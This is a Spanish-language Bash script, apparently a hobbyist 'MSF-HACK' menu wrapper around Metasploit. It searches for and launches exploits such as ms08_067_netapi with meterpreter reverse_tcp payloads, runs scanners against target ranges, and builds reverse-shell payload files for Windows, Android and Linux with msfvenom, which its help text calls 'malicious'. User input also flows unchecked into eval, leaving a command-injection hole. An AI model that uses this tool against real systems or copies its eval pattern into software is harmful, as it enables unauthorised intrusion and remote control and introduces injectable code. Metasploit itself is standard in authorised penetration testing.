#!/bin/bash

# Colores
CYAN='\033[1;36m'
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
RESET='\033[0m'

# Ruta del ejecutable de Metasploit
MSF_PATH="/opt/metasploit-framework/msfconsole"

# Verifica si es root
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Debes ejecutar este script como root.${RESET}"
    exit 1
fi

# Verifica si Metasploit está instalado
if [[ ! -x "$MSF_PATH" ]]; then
    echo -e "${RED}[!] Metasploit Framework no está instalado o no es ejecutable en $MSF_PATH.${RESET}"
    exit 1
fi

# Detectar IP automáticamente
get_ip() {
    ip addr | grep inet | grep -v 127 | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -n 1
}

# Título
clear
echo -e "${CYAN}"
echo "╔═════════════════════════════════════════════════╗"
echo "║               ░░ M E T A S ░░ H A C K ░░         ║"
echo "║        Automatización de tareas con MSF         ║"
echo "╚═════════════════════════════════════════════════╝"
echo -e "${RESET}"

# Guardado de logs
guardar_log() {
    read -p "¿Deseas guardar la salida en un archivo? (s/n): " save
    if [[ "$save" == "s" ]]; then
        read -p "Ruta del archivo (ej: /home/user/msf.log): " logfile
        LOG=" | tee \"$logfile\""
    else
        LOG=""
    fi
}

# Función de ayuda
mostrar_ayuda() {
    echo -e "${YELLOW}>> AYUDA - ¿Qué hace cada opción?${RESET}"
    echo -e "${GREEN}
1) Buscar exploit: Buscar vulnerabilidades por palabras clave.
2) Ejecutar exploit: Cargar y lanzar un exploit manualmente.
3) Generar payload: Crear un archivo malicioso con msfvenom.
4) Listar exploits: Mostrar todos los exploits en la base de datos.
5) Ejecutar módulo auxiliar: Ejecutar un scanner u otro módulo auxiliar.
6) Mostrar ayuda: Explicación de cada opción.
7) Salir: Cierra el script.${RESET}"
}

# Menú principal
while true; do
    echo -e "${GREEN}
╔═══════════════════════════════════════╗
║             MENÚ MSF-HACK            ║
╠═══════════════════════════════════════╣
║ 1. Buscar exploit por palabra clave  ║
║ 2. Ejecutar exploit manualmente      ║
║ 3. Generar payload con msfvenom      ║
║ 4. Listar exploits disponibles       ║
║ 5. Ejecutar módulo auxiliar          ║
║ 6. Mostrar ayuda                     ║
║ 7. Salir                             ║
╚═══════════════════════════════════════╝
${RESET}"

    read -p ">> Elige una opción [1-7]: " op

    case $op in
        1)
            read -p ">> Palabra clave para buscar exploits: " key
            guardar_log
            echo -e "${YELLOW}[*] Buscando exploits...${RESET}"
            eval "$MSF_PATH -q -x 'search $key; exit'" $LOG
            ;;
        2)
            read -p ">> Exploit (ej: exploit/windows/smb/ms08_067_netapi): " exploit
            read -p ">> Payload (ej: windows/meterpreter/reverse_tcp): " payload
            lhost=$(get_ip)
            echo -e ">> IP detectada automáticamente: ${CYAN}$lhost${RESET}"
            read -p ">> LPORT (ej: 4444): " lport
            guardar_log
            echo -e "${YELLOW}[*] Ejecutando exploit...${RESET}"
            eval "$MSF_PATH -q -x 'use $exploit; set PAYLOAD $payload; set LHOST $lhost; set LPORT $lport; exploit; exit'" $LOG
            ;;
        3)
            read -p ">> Plataforma (windows/android/linux): " os
            lhost=$(get_ip)
            echo -e ">> IP detectada automáticamente: ${CYAN}$lhost${RESET}"
            read -p ">> LPORT: " lport
            read -p ">> Ruta de salida del archivo (ej: /tmp/payload.exe): " salida

            case $os in
                windows) payload="windows/meterpreter/reverse_tcp" ;;
                android) payload="android/meterpreter/reverse_tcp" ;;
                linux) payload="linux/x86/meterpreter/reverse_tcp" ;;
                *)
                    echo -e "${RED}[!] Plataforma no válida.${RESET}"
                    continue ;;
            esac

            echo -e "${YELLOW}[*] Generando payload...${RESET}"
            msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f raw -o "$salida"
            echo -e "${GREEN}[+] Payload guardado en $salida${RESET}"
            ;;
        4)
            guardar_log
            echo -e "${YELLOW}[*] Listando exploits disponibles...${RESET}"
            eval "$MSF_PATH -q -x 'show exploits; exit'" $LOG
            ;;
        5)
            read -p ">> Módulo auxiliar (ej: auxiliary/scanner/ftp/ftp_version): " modulo
            read -p ">> RHOSTS (IP objetivo o rango): " rhosts
            guardar_log
            echo -e "${YELLOW}[*] Ejecutando módulo auxiliar...${RESET}"
            eval "$MSF_PATH -q -x 'use $modulo; set RHOSTS $rhosts; run; exit'" $LOG
            ;;
        6)
            clear
            mostrar_ayuda
            ;;
        7)
            echo -e "${GREEN}[+] Saliendo...${RESET}"
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Opción no válida.${RESET}"
            ;;
    esac

    echo -e "${CYAN}\nPresiona Enter para continuar...${RESET}"
    read
    clear
done
